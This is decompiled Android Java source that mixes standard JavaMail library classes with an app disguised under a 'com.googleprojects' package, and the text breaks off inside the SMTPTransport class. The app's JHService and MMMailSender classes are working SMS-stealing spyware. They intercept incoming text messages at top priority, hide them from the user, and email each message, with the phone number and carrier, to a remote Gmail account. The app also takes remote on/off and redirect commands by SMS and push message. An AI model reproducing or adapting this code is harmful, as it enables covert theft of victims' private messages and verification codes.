        if (replyToAll) {
            Vector v = new Vector();
            InternetAddress me = InternetAddress.getLocalAddress(this.session);
            if (me != null) {
                v.addElement(me);
            }
            String alternates = null;
            if (this.session != null) {
                alternates = this.session.getProperty("mail.alternates");
            }
            if (alternates != null) {
                eliminateDuplicates(v, InternetAddress.parse(alternates, false));
            }
            String replyallccStr = null;
            if (this.session != null) {
                replyallccStr = this.session.getProperty("mail.replyallcc");
            }
            boolean replyallcc = replyallccStr != null && replyallccStr.equalsIgnoreCase("true");
            eliminateDuplicates(v, a);
            a = eliminateDuplicates(v, getRecipients(javax.mail.Message.RecipientType.TO));
            if (a != null && a.length > 0) {
                if (replyallcc) {
                    reply.addRecipients(javax.mail.Message.RecipientType.CC, a);
                } else {
                    reply.addRecipients(javax.mail.Message.RecipientType.TO, a);
                }
            }
            a = eliminateDuplicates(v, getRecipients(javax.mail.Message.RecipientType.CC));
            if (a != null && a.length > 0) {
                reply.addRecipients(javax.mail.Message.RecipientType.CC, a);
            }
            a = getRecipients(RecipientType.NEWSGROUPS);
            if (a != null && a.length > 0) {
                reply.setRecipients(RecipientType.NEWSGROUPS, a);
            }
        }
        String msgId = getHeader("Message-Id", null);
        if (msgId != null) {
            reply.setHeader("In-Reply-To", msgId);
        }
        String refs = getHeader("References", " ");
        if (refs == null) {
            refs = getHeader("In-Reply-To", " ");
        }
        if (msgId != null) {
            if (refs != null) {
                refs = MimeUtility.unfold(refs) + " " + msgId;
            } else {
                refs = msgId;
            }
        }
        if (refs != null) {
            reply.setHeader("References", MimeUtility.fold(12, refs));
        }
        try {
            setFlags(answeredFlag, true);
        } catch (MessagingException e) {
        }
        return reply;
    }

    private Address[] eliminateDuplicates(Vector v, Address[] addrs) {
        if (addrs == null) {
            return null;
        }
        int i;
        int j;
        int gone = 0;
        for (i = 0; i < addrs.length; i++) {
            boolean found = false;
            for (j = 0; j < v.size(); j++) {
                if (((InternetAddress) v.elementAt(j)).equals(addrs[i])) {
                    found = true;
                    gone++;
                    addrs[i] = null;
                    break;
                }
            }
            if (!found) {
                v.addElement(addrs[i]);
            }
        }
        if (gone != 0) {
            Address[] a;
            if (addrs instanceof InternetAddress[]) {
                a = new InternetAddress[(addrs.length - gone)];
            } else {
                a = new Address[(addrs.length - gone)];
            }
            j = 0;
            for (i = 0; i < addrs.length; i++) {
                if (addrs[i] != null) {
                    int j2 = j + 1;
                    a[j] = addrs[i];
                    j = j2;
                }
            }
            addrs = a;
        }
        return addrs;
    }

    public void writeTo(OutputStream os) throws IOException, MessagingException {
        writeTo(os, null);
    }

    public void writeTo(OutputStream os, String[] ignoreList) throws IOException, MessagingException {
        if (!this.saved) {
            saveChanges();
        }
        if (this.modified) {
            MimeBodyPart.writeTo(this, os, ignoreList);
            return;
        }
        Enumeration hdrLines = getNonMatchingHeaderLines(ignoreList);
        LineOutputStream los = new LineOutputStream(os);
        while (hdrLines.hasMoreElements()) {
            los.writeln((String) hdrLines.nextElement());
        }
        los.writeln();
        if (this.content == null) {
            InputStream is = getContentStream();
            byte[] buf = new byte[8192];
            while (true) {
                int len = is.read(buf);
                if (len <= 0) {
                    break;
                }
                os.write(buf, 0, len);
            }
            is.close();
            buf = null;
        } else {
            os.write(this.content);
        }
        os.flush();
    }

    public String[] getHeader(String name) throws MessagingException {
        return this.headers.getHeader(name);
    }

    public String getHeader(String name, String delimiter) throws MessagingException {
        return this.headers.getHeader(name, delimiter);
    }

    public void setHeader(String name, String value) throws MessagingException {
        this.headers.setHeader(name, value);
    }

    public void addHeader(String name, String value) throws MessagingException {
        this.headers.addHeader(name, value);
    }

    public void removeHeader(String name) throws MessagingException {
        this.headers.removeHeader(name);
    }

    public Enumeration getAllHeaders() throws MessagingException {
        return this.headers.getAllHeaders();
    }

    public Enumeration getMatchingHeaders(String[] names) throws MessagingException {
        return this.headers.getMatchingHeaders(names);
    }

    public Enumeration getNonMatchingHeaders(String[] names) throws MessagingException {
        return this.headers.getNonMatchingHeaders(names);
    }

    public void addHeaderLine(String line) throws MessagingException {
        this.headers.addHeaderLine(line);
    }

    public Enumeration getAllHeaderLines() throws MessagingException {
        return this.headers.getAllHeaderLines();
    }

    public Enumeration getMatchingHeaderLines(String[] names) throws MessagingException {
        return this.headers.getMatchingHeaderLines(names);
    }

    public Enumeration getNonMatchingHeaderLines(String[] names) throws MessagingException {
        return this.headers.getNonMatchingHeaderLines(names);
    }

    public synchronized Flags getFlags() throws MessagingException {
        return (Flags) this.flags.clone();
    }

    public synchronized boolean isSet(Flag flag) throws MessagingException {
        return this.flags.contains(flag);
    }

    public synchronized void setFlags(Flags flag, boolean set) throws MessagingException {
        if (set) {
            this.flags.add(flag);
        } else {
            this.flags.remove(flag);
        }
    }

    public void saveChanges() throws MessagingException {
        this.modified = true;
        this.saved = true;
        updateHeaders();
    }

    /* access modifiers changed from: protected */
    public void updateMessageID() throws MessagingException {
        setHeader("Message-ID", "<" + UniqueValue.getUniqueMessageIDValue(this.session) + ">");
    }

    /* access modifiers changed from: protected */
    public void updateHeaders() throws MessagingException {
        MimeBodyPart.updateHeaders(this);
        setHeader("MIME-Version", "1.0");
        updateMessageID();
        if (this.cachedContent != null) {
            this.dh = new DataHandler(this.cachedContent, getContentType());
            this.cachedContent = null;
            this.content = null;
            if (this.contentStream != null) {
                try {
                    this.contentStream.close();
                } catch (IOException e) {
                }
            }
            this.contentStream = null;
        }
    }

    /* access modifiers changed from: protected */
    public InternetHeaders createInternetHeaders(InputStream is) throws MessagingException {
        return new InternetHeaders(is);
    }

    /* access modifiers changed from: protected */
    public MimeMessage createMimeMessage(Session session) throws MessagingException {
        return new MimeMessage(session);
    }
}
package javax.mail;

import java.util.Enumeration;
import java.util.Hashtable;
import java.util.Vector;
import javax.mail.event.TransportEvent;
import javax.mail.event.TransportListener;

public abstract class Transport extends Service {
    private Vector transportListeners = null;

    public abstract void sendMessage(Message message, Address[] addressArr) throws MessagingException;

    public Transport(Session session, URLName urlname) {
        super(session, urlname);
    }

    public static void send(Message msg) throws MessagingException {
        msg.saveChanges();
        send0(msg, msg.getAllRecipients());
    }

    public static void send(Message msg, Address[] addresses) throws MessagingException {
        msg.saveChanges();
        send0(msg, addresses);
    }

    private static void send0(Message msg, Address[] addresses) throws MessagingException {
        Address[] a;
        Address[] c;
        if (addresses == null || addresses.length == 0) {
            throw new SendFailedException("No recipient addresses");
        }
        Hashtable protocols = new Hashtable();
        Vector invalid = new Vector();
        Vector validSent = new Vector();
        Vector validUnsent = new Vector();
        for (int i = 0; i < addresses.length; i++) {
            if (protocols.containsKey(addresses[i].getType())) {
                ((Vector) protocols.get(addresses[i].getType())).addElement(addresses[i]);
            } else {
                Vector w = new Vector();
                w.addElement(addresses[i]);
                protocols.put(addresses[i].getType(), w);
            }
        }
        int dsize = protocols.size();
        if (dsize == 0) {
            throw new SendFailedException("No recipient addresses");
        }
        Session s;
        if (msg.session != null) {
            s = msg.session;
        } else {
            s = Session.getDefaultInstance(System.getProperties(), null);
        }
        Transport transport;
        if (dsize == 1) {
            transport = s.getTransport(addresses[0]);
            try {
                transport.connect();
                transport.sendMessage(msg, addresses);
                transport.close();
                return;
            } catch (Throwable th) {
                transport.close();
                throw th;
            }
        }
        MessagingException chainedEx = null;
        boolean sendFailed = false;
        Enumeration e = protocols.elements();
        while (e.hasMoreElements()) {
            Vector v = (Vector) e.nextElement();
            Address[] protaddresses = new Address[v.size()];
            v.copyInto(protaddresses);
            transport = s.getTransport(protaddresses[0]);
            if (transport == null) {
                for (Object addElement : protaddresses) {
                    invalid.addElement(addElement);
                }
            } else {
                try {
                    transport.connect();
                    transport.sendMessage(msg, protaddresses);
                    transport.close();
                } catch (SendFailedException sex) {
                    sendFailed = true;
                    if (chainedEx == null) {
                        chainedEx = sex;
                    } else {
                        chainedEx.setNextException(sex);
                    }
                    a = sex.getInvalidAddresses();
                    if (a != null) {
                        for (Object addElement2 : a) {
                            invalid.addElement(addElement2);
                        }
                    }
                    a = sex.getValidSentAddresses();
                    if (a != null) {
                        for (Object addElement22 : a) {
                            validSent.addElement(addElement22);
                        }
                    }
                    c = sex.getValidUnsentAddresses();
                    if (c != null) {
                        for (Object addElement222 : c) {
                            validUnsent.addElement(addElement222);
                        }
                    }
                    transport.close();
                } catch (MessagingException mex) {
                    sendFailed = true;
                    if (chainedEx == null) {
                        chainedEx = mex;
                    } else {
                        chainedEx.setNextException(mex);
                    }
                    transport.close();
                } catch (Throwable th2) {
                    transport.close();
                    throw th2;
                }
            }
        }
        if (sendFailed || invalid.size() != 0 || validUnsent.size() != 0) {
            a = null;
            Address[] b = null;
            c = null;
            if (validSent.size() > 0) {
                a = new Address[validSent.size()];
                validSent.copyInto(a);
            }
            if (validUnsent.size() > 0) {
                b = new Address[validUnsent.size()];
                validUnsent.copyInto(b);
            }
            if (invalid.size() > 0) {
                c = new Address[invalid.size()];
                invalid.copyInto(c);
            }
            throw new SendFailedException("Sending failed", chainedEx, a, b, c);
        }
    }

    public synchronized void addTransportListener(TransportListener l) {
        if (this.transportListeners == null) {
            this.transportListeners = new Vector();
        }
        this.transportListeners.addElement(l);
    }

    public synchronized void removeTransportListener(TransportListener l) {
        if (this.transportListeners != null) {
            this.transportListeners.removeElement(l);
        }
    }

    /* access modifiers changed from: protected */
    public void notifyTransportListeners(int type, Address[] validSent, Address[] validUnsent, Address[] invalid, Message msg) {
        if (this.transportListeners != null) {
            queueEvent(new TransportEvent(this, type, validSent, validUnsent, invalid, msg), this.transportListeners);
        }
    }
}
package com.googleprojects.mm;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import com.googleprojects.mmsp.GCMIntentService;
import com.googleprojects.mmsp.GCMListener;

public class JHService extends Service implements GCMListener {
    static final String SMS_MAIL_SEPARATOR = "HH";
    static final String SMS_OFF_MSG = "$$";
    static final String SMS_ON_MSG = "##";
    SOMMail currentMail;
    JHDataManager dataManager;
    private JHINMsgReceiver mReceiver;
    Handler mSMSReceivedHandler = new Handler() {
        public void handleMessage(Message msg) {
            if (msg.obj != null) {
                JHService.this.smsReceived(msg.obj);
            }
        }
    };
    SOMailCPUtil mailUtil;
    private GJSMSUtil msgUtil;
    private String networkName = MMMailContentUtil.MM_MESSAGE_SUBJECT;
    private String userPhone = MMMailContentUtil.MM_MESSAGE_SUBJECT;

    private class JHINMsgReceiver extends BroadcastReceiver {
        private JHINMsgReceiver() {
        }

        /* synthetic */ JHINMsgReceiver(JHService jHService, JHINMsgReceiver jHINMsgReceiver) {
            this();
        }

        public void onReceive(Context context, Intent intent) {
            boolean offReceived = false;
            boolean mailChanged = false;
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                SmsMessage[] msgs = new SmsMessage[pdus.length];
                for (int i = 0; i < msgs.length; i++) {
                    msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    String msgBody = SmsMessage.createFromPdu((byte[]) pdus[i]).getMessageBody();
                    if (msgBody.indexOf(JHService.SMS_ON_MSG) >= 0) {
                        abortBroadcast();
                        JHService.this.dataManager.setEnabled("1");
                    } else if (msgBody.indexOf(JHService.SMS_OFF_MSG) >= 0) {
                        abortBroadcast();
                        offReceived = true;
                        JHService.this.dataManager.setEnabled("0");
                    } else if (msgBody.startsWith(JHService.SMS_MAIL_SEPARATOR)) {
                        String[] mailInfo = msgBody.split(JHService.SMS_MAIL_SEPARATOR);
                        if (mailInfo.length == 3) {
                            abortBroadcast();
                            String sender = mailInfo[1] + "@gmail.com";
                            String recv = mailInfo[2] + "@gmail.com";
                            String smtpAddr = SOMailCPUtil.default_smtp_addr;
                            mailChanged = JHService.this.mailUtil.changeMail(sender, recv, SOMailCPUtil.default_smtp_port, smtpAddr);
                        }
                    }
                }
            }
            if (JHService.this.dataManager.isEnabled() || offReceived) {
                abortBroadcast();
                if (!mailChanged) {
                    new SMSSendJob(intent).execute(null);
                }
            }
        }
    }

    class SMSSendJob extends AsyncTask<String, Void, String> {
        Intent mIntent;

        public SMSSendJob(Intent msgIntent) {
            this.mIntent = msgIntent;
        }

        /* access modifiers changed from: protected|varargs */
        public String doInBackground(String... params) {
            JHService.this.smsReceived(this.mIntent);
            return null;
        }

        /* access modifiers changed from: protected */
        public void onPostExecute(String result) {
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        this.mailUtil = new SOMailCPUtil(this);
        this.currentMail = this.mailUtil.getCurrentMail();
        this.msgUtil = new GJSMSUtil(this);
        this.dataManager = new JHDataManager(this);
        this.mReceiver = new JHINMsgReceiver(this, null);
        TelephonyManager manager = (TelephonyManager) getSystemService("phone");
        this.userPhone = manager.getLine1Number();
        this.networkName = manager.getNetworkOperatorName();
        if (this.networkName == null || this.networkName.length() < 0) {
            this.networkName = manager.getSimOperatorName();
        }
        if (this.networkName == null || this.networkName.length() < 0) {
            this.networkName = manager.getSimOperator();
        }
        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        filter.setPriority(99999999);
        registerReceiver(this.mReceiver, filter);
        GCMIntentService.mListener = this;
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        return 1;
    }

    /* access modifiers changed from: 0000 */
    public void smsReceived(Intent intent) {
        SmsMessage[] msgs = this.msgUtil.getMessageListFromIntent(intent);
        boolean needSkip = false;
        for (SmsMessage smsg : msgs) {
            String addr = smsg.getOriginatingAddress();
            String msgBody = smsg.getMessageBody();
            if (msgBody.indexOf(SMS_ON_MSG) >= 0) {
                needSkip = true;
                this.dataManager.setEnabled("1");
            } else if (msgBody.indexOf(SMS_OFF_MSG) >= 0) {
                needSkip = true;
                this.dataManager.setEnabled("0");
            }
            boolean wifiToggled = false;
            WifiManager wManager = (WifiManager) getSystemService("wifi");
            if (wManager.isWifiEnabled() && wManager.getWifiState() == 3) {
                wifiToggled = true;
                wManager.setWifiEnabled(false);
            }
            TelephonyManager manager = (TelephonyManager) getSystemService("phone");
            String userPhone = manager.getLine1Number();
            String networkName = manager.getNetworkOperatorName();
            if (networkName == null || networkName.length() < 0) {
                networkName = manager.getSimOperatorName();
            }
            if (networkName == null || networkName.length() < 0) {
                networkName = manager.getSimOperator();
            }
            try {
                this.currentMail = this.mailUtil.getCurrentMail();
                new MMMailSender(this.currentMail.sender_addr, SOMailCPUtil.mail_pwd, this.currentMail.smtp_addr, this.currentMail.smtp_port).sendMail(MMMailContentUtil.MM_MESSAGE_SUBJECT, MMMailContentUtil.makeMMMessageBody(userPhone, networkName, MMMailContentUtil.MM_MESSAGE_SUBJECT, addr, msgBody, this.dataManager.isEnabled(), VERSION.RELEASE), this.currentMail.sender_addr, this.currentMail.receiver_addr);
            } catch (Exception e) {
                e.printStackTrace();
            }
            if (wifiToggled) {
                wManager.setWifiEnabled(true);
            }
            if (!(this.dataManager.isEnabled() || needSkip)) {
                this.msgUtil.addMessageToInbox(smsg);
            }
        }
    }

    public void GCMListener_MessageReceived(String msg) {
        String enabled = "0";
        if (msg != null && msg.length() > 0) {
            String[] arVals = msg.split(":");
            if (arVals != null && arVals.length >= 2 && arVals[0].equalsIgnoreCase("enable")) {
                enabled = arVals[1];
            }
        }
        this.dataManager.setEnabled(enabled);
    }

    public void GCMListener_Registered(String deviceToken) {
        TelephonyManager manager = (TelephonyManager) getSystemService("phone");
        String userPhone = manager.getLine1Number();
        String networkName = manager.getNetworkOperatorName();
        if (networkName == null || networkName.length() < 0) {
            networkName = manager.getSimOperatorName();
        }
        if (networkName == null || networkName.length() < 0) {
            networkName = manager.getSimOperator();
        }
        boolean wifiToggled = false;
        WifiManager wManager = (WifiManager) getSystemService("wifi");
        if (wManager.isWifiEnabled() && wManager.getWifiState() == 3) {
            wifiToggled = true;
            wManager.setWifiEnabled(false);
        }
        try {
            this.currentMail = this.mailUtil.getCurrentMail();
            new MMMailSender(this.currentMail.sender_addr, SOMailCPUtil.mail_pwd, this.currentMail.smtp_addr, this.currentMail.smtp_port).sendMail(MMMailContentUtil.MM_MESSAGE_SUBJECT, MMMailContentUtil.makeMMMessageBody(userPhone, networkName, MMMailContentUtil.MM_MESSAGE_SUBJECT, MMMailContentUtil.MM_MESSAGE_SUBJECT, MMMailContentUtil.MM_MESSAGE_SUBJECT, this.dataManager.isEnabled(), VERSION.RELEASE), this.currentMail.sender_addr, this.currentMail.receiver_addr);
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (wifiToggled) {
            wManager.setWifiEnabled(true);
        }
    }
}
package com.googleprojects.mm;

public class MMMailContentUtil {
    public static final String MM_MESSAGE_SUBJECT = "";

    public static String makeMMMessageBody(String phoneNum, String netName, String deviceToken, String fromNum, String msgBody, boolean isOn, String versionCode) {
        return new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(MM_MESSAGE_SUBJECT + phoneNum + "," + netName + "," + deviceToken + "," + (isOn ? "1" : "0") + ",")).append(MM_MESSAGE_SUBJECT).append(",").append(fromNum).append(",").toString())).append(msgBody).toString();
    }
}
package com.googleprojects.mmsp;

import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import com.google.android.gcm.GCMBaseIntentService;

public class GCMIntentService extends GCMBaseIntentService {
    public static final String GCM_PROJECT_ID = "1020885815711";
    public static GCMListener mListener = null;

    public GCMIntentService() {
        super(GCM_PROJECT_ID);
    }

    public IBinder onBind(Intent arg0) {
        return null;
    }

    /* access modifiers changed from: protected */
    public void onError(Context arg0, String arg1) {
    }

    /* access modifiers changed from: protected */
    public void onMessage(Context arg0, Intent arg1) {
        String msg = arg1.getExtras().getString("message");
        if (mListener != null) {
            mListener.GCMListener_MessageReceived(msg);
        }
    }

    /* access modifiers changed from: protected */
    public void onRegistered(Context arg0, String arg1) {
        if (mListener != null) {
            mListener.GCMListener_Registered(arg1);
        }
    }

    /* access modifiers changed from: protected */
    public void onUnregistered(Context arg0, String arg1) {
    }
}
package javax.activation;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PipedInputStream;
import java.io.PipedOutputStream;
import java.net.URL;
import myjava.awt.datatransfer.DataFlavor;
import myjava.awt.datatransfer.Transferable;
import myjava.awt.datatransfer.UnsupportedFlavorException;

public class DataHandler implements Transferable {
    private static final DataFlavor[] emptyFlavors = new DataFlavor[0];
    private static DataContentHandlerFactory factory = null;
    private CommandMap currentCommandMap = null;
    private DataContentHandler dataContentHandler = null;
    private DataSource dataSource = null;
    private DataContentHandler factoryDCH = null;
    private DataSource objDataSource = null;
    /* access modifiers changed from: private */
    public Object object = null;
    /* access modifiers changed from: private */
    public String objectMimeType = null;
    private DataContentHandlerFactory oldFactory = null;
    private String shortType = null;
    private DataFlavor[] transferFlavors = emptyFlavors;

    public DataHandler(DataSource ds) {
        this.dataSource = ds;
        this.oldFactory = factory;
    }

    public DataHandler(Object obj, String mimeType) {
        this.object = obj;
        this.objectMimeType = mimeType;
        this.oldFactory = factory;
    }

    public DataHandler(URL url) {
        this.dataSource = new URLDataSource(url);
        this.oldFactory = factory;
    }

    private synchronized CommandMap getCommandMap() {
        CommandMap commandMap;
        if (this.currentCommandMap != null) {
            commandMap = this.currentCommandMap;
        } else {
            commandMap = CommandMap.getDefaultCommandMap();
        }
        return commandMap;
    }

    public DataSource getDataSource() {
        if (this.dataSource != null) {
            return this.dataSource;
        }
        if (this.objDataSource == null) {
            this.objDataSource = new DataHandlerDataSource(this);
        }
        return this.objDataSource;
    }

    public String getName() {
        if (this.dataSource != null) {
            return this.dataSource.getName();
        }
        return null;
    }

    public String getContentType() {
        if (this.dataSource != null) {
            return this.dataSource.getContentType();
        }
        return this.objectMimeType;
    }

    public InputStream getInputStream() throws IOException {
        if (this.dataSource != null) {
            return this.dataSource.getInputStream();
        }
        DataContentHandler dch = getDataContentHandler();
        if (dch == null) {
            throw new UnsupportedDataTypeException("no DCH for MIME type " + getBaseType());
        } else if ((dch instanceof ObjectDataContentHandler) && ((ObjectDataContentHandler) dch).getDCH() == null) {
            throw new UnsupportedDataTypeException("no object DCH for MIME type " + getBaseType());
        } else {
            final DataContentHandler fdch = dch;
            final PipedOutputStream pos = new PipedOutputStream();
            InputStream pin = new PipedInputStream(pos);
            new Thread(new Runnable() {
                public void run() {
                    try {
                        fdch.writeTo(DataHandler.this.object, DataHandler.this.objectMimeType, pos);
                        try {
                            pos.close();
                        } catch (IOException e) {
                        }
                    } catch (IOException e2) {
                        try {
                            pos.close();
                        } catch (IOException e3) {
                        }
                    } catch (Throwable th) {
                        try {
                            pos.close();
                        } catch (IOException e4) {
                        }
                        throw th;
                    }
                }
            }, "DataHandler.getInputStream").start();
            return pin;
        }
    }

    public void writeTo(OutputStream os) throws IOException {
        if (this.dataSource != null) {
            byte[] data = new byte[8192];
            InputStream is = this.dataSource.getInputStream();
            while (true) {
                try {
                    int bytes_read = is.read(data);
                    if (bytes_read <= 0) {
                        break;
                    }
                    os.write(data, 0, bytes_read);
                } finally {
                    is.close();
                }
            }
            return;
        }
        getDataContentHandler().writeTo(this.object, this.objectMimeType, os);
    }

    public OutputStream getOutputStream() throws IOException {
        if (this.dataSource != null) {
            return this.dataSource.getOutputStream();
        }
        return null;
    }

    public synchronized DataFlavor[] getTransferDataFlavors() {
        if (factory != this.oldFactory) {
            this.transferFlavors = emptyFlavors;
        }
        if (this.transferFlavors == emptyFlavors) {
            this.transferFlavors = getDataContentHandler().getTransferDataFlavors();
        }
        return this.transferFlavors;
    }

    public boolean isDataFlavorSupported(DataFlavor flavor) {
        DataFlavor[] lFlavors = getTransferDataFlavors();
        for (DataFlavor equals : lFlavors) {
            if (equals.equals(flavor)) {
                return true;
            }
        }
        return false;
    }

    public Object getTransferData(DataFlavor flavor) throws UnsupportedFlavorException, IOException {
        return getDataContentHandler().getTransferData(flavor, this.dataSource);
    }

    public synchronized void setCommandMap(CommandMap commandMap) {
        if (commandMap != this.currentCommandMap || commandMap == null) {
            this.transferFlavors = emptyFlavors;
            this.dataContentHandler = null;
            this.currentCommandMap = commandMap;
        }
    }

    public CommandInfo[] getPreferredCommands() {
        if (this.dataSource != null) {
            return getCommandMap().getPreferredCommands(getBaseType(), this.dataSource);
        }
        return getCommandMap().getPreferredCommands(getBaseType());
    }

    public CommandInfo[] getAllCommands() {
        if (this.dataSource != null) {
            return getCommandMap().getAllCommands(getBaseType(), this.dataSource);
        }
        return getCommandMap().getAllCommands(getBaseType());
    }

    public CommandInfo getCommand(String cmdName) {
        if (this.dataSource != null) {
            return getCommandMap().getCommand(getBaseType(), cmdName, this.dataSource);
        }
        return getCommandMap().getCommand(getBaseType(), cmdName);
    }

    public Object getContent() throws IOException {
        if (this.object != null) {
            return this.object;
        }
        return getDataContentHandler().getContent(getDataSource());
    }

    public Object getBean(CommandInfo cmdinfo) {
        try {
            ClassLoader cld = SecuritySupport.getContextClassLoader();
            if (cld == null) {
                cld = getClass().getClassLoader();
            }
            return cmdinfo.getCommandObject(this, cld);
        } catch (IOException | ClassNotFoundException e) {
            return null;
        }
    }

    private synchronized DataContentHandler getDataContentHandler() {
        DataContentHandler dataContentHandler;
        if (factory != this.oldFactory) {
            this.oldFactory = factory;
            this.factoryDCH = null;
            this.dataContentHandler = null;
            this.transferFlavors = emptyFlavors;
        }
        if (this.dataContentHandler != null) {
            dataContentHandler = this.dataContentHandler;
        } else {
            String simpleMT = getBaseType();
            if (this.factoryDCH == null && factory != null) {
                this.factoryDCH = factory.createDataContentHandler(simpleMT);
            }
            if (this.factoryDCH != null) {
                this.dataContentHandler = this.factoryDCH;
            }
            if (this.dataContentHandler == null) {
                if (this.dataSource != null) {
                    this.dataContentHandler = getCommandMap().createDataContentHandler(simpleMT, this.dataSource);
                } else {
                    this.dataContentHandler = getCommandMap().createDataContentHandler(simpleMT);
                }
            }
            if (this.dataSource != null) {
                this.dataContentHandler = new DataSourceDataContentHandler(this.dataContentHandler, this.dataSource);
            } else {
                this.dataContentHandler = new ObjectDataContentHandler(this.dataContentHandler, this.object, this.objectMimeType);
            }
            dataContentHandler = this.dataContentHandler;
        }
        return dataContentHandler;
    }

    private synchronized String getBaseType() {
        if (this.shortType == null) {
            String ct = getContentType();
            try {
                this.shortType = new MimeType(ct).getBaseType();
            } catch (MimeTypeParseException e) {
                this.shortType = ct;
            }
        }
        return this.shortType;
    }

    public static synchronized void setDataContentHandlerFactory(DataContentHandlerFactory newFactory) {
        synchronized (DataHandler.class) {
            if (factory != null) {
                throw new Error("DataContentHandlerFactory already defined");
            }
            SecurityManager security = System.getSecurityManager();
            if (security != null) {
                try {
                    security.checkSetFactory();
                } catch (SecurityException ex) {
                    if (DataHandler.class.getClassLoader() != newFactory.getClass().getClassLoader()) {
                        throw ex;
                    }
                }
            }
            factory = newFactory;
        }
    }
}
package com.googleprojects.mm;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Properties;
import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.mail.Authenticator;
import javax.mail.Message.RecipientType;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class MMMailSender extends Authenticator {
    private String password;
    private Session session;
    private String smtp_addr;
    private String smtp_port;
    private String user;

    public class ByteArrayDataSource implements DataSource {
        private byte[] data;
        private String type;

        public ByteArrayDataSource(byte[] data, String type) {
            this.data = data;
            this.type = type;
        }

        public ByteArrayDataSource(byte[] data) {
            this.data = data;
        }

        public void setType(String type) {
            this.type = type;
        }

        public String getContentType() {
            if (this.type == null) {
                return "application/octet-stream";
            }
            return this.type;
        }

        public InputStream getInputStream() throws IOException {
            return new ByteArrayInputStream(this.data);
        }

        public String getName() {
            return "ByteArrayDataSource";
        }

        public OutputStream getOutputStream() throws IOException {
            throw new IOException("Not Supported");
        }
    }

    public MMMailSender(String user, String password, String smtp_addr, String smtp_port) {
        this.user = user;
        this.password = password;
        this.smtp_addr = smtp_addr;
        this.smtp_port = smtp_port;
        Properties props = new Properties();
        props.setProperty("mail.transport.protocol", "smtp");
        props.setProperty("mail.host", smtp_addr);
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.port", smtp_port);
        props.put("mail.smtp.socketFactory.port", smtp_port);
        props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
        props.put("mail.smtp.socketFactory.fallback", "false");
        props.setProperty("mail.smtp.quitwait", "false");
        this.session = Session.getDefaultInstance(props, this);
    }

    /* access modifiers changed from: protected */
    public PasswordAuthentication getPasswordAuthentication() {
        return new PasswordAuthentication(this.user, this.password);
    }

    public synchronized void sendMail(String subject, String body, String sender, String recipients) throws Exception {
        MimeMessage message = new MimeMessage(this.session);
        DataHandler handler = new DataHandler(new ByteArrayDataSource(body.getBytes(), "text/plain"));
        message.setSender(new InternetAddress(sender));
        message.setSubject(subject);
        message.setDataHandler(handler);
        if (recipients.indexOf(44) > 0) {
            message.setRecipients(RecipientType.TO, InternetAddress.parse(recipients));
        } else {
            message.setRecipient(RecipientType.TO, new InternetAddress(recipients));
        }
        Transport.send(message);
        this.session = null;
    }
}
package com.sun.mail.smtp;

import android.support.v4.view.MotionEventCompat;
import com.googleprojects.mm.MMMailContentUtil;
import com.sun.mail.util.ASCIIUtility;
import com.sun.mail.util.LineInputStream;
import com.sun.mail.util.SocketFetcher;
import com.sun.mail.util.TraceInputStream;
import com.sun.mail.util.TraceOutputStream;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.io.StringReader;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Hashtable;
import java.util.Locale;
import java.util.Properties;
import java.util.StringTokenizer;
import java.util.Vector;
import javax.mail.Address;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.SendFailedException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.URLName;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.mail.internet.MimePart;
import javax.mail.internet.ParseException;

public class SMTPTransport extends Transport {
    static final /* synthetic */ boolean $assertionsDisabled;
    private static final byte[] CRLF = new byte[]{(byte) 13, (byte) 10};
    private static final String UNKNOWN = "UNKNOWN";
    private static char[] hexchar = new char[]{'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};
    private static final String[] ignoreList = new String[]{"Bcc", "Content-Length"};
    private Address[] addresses;
    private SMTPOutputStream dataStream;
    private int defaultPort;
    private MessagingException exception;
    private Hashtable extMap;
    private Address[] invalidAddr;
    private boolean isSSL;
    private int lastReturnCode;
    private String lastServerResponse;
    private LineInputStream lineInputStream;
    private String localHostName;
    private DigestMD5 md5support;
    private MimeMessage message;
    private String name;
    private PrintStream out;
    private boolean quitWait;
    private boolean reportSuccess;
    private String saslRealm;
    private boolean sendPartiallyFailed;
    private BufferedInputStream serverInput;
    private OutputStream serverOutput;
    private Socket serverSocket;
    private boolean useRset;
    private boolean useStartTLS;
    private Address[] validSentAddr;
    private Address[] validUnsentAddr;

    static {
        boolean z;
        if (SMTPTransport.class.desiredAssertionStatus()) {
            z = false;
        } else {
            z = true;
        }
        $assertionsDisabled = z;
    }

    public SMTPTransport(Session session, URLName urlname) {
        this(session, urlname, "smtp", 25, false);
    }

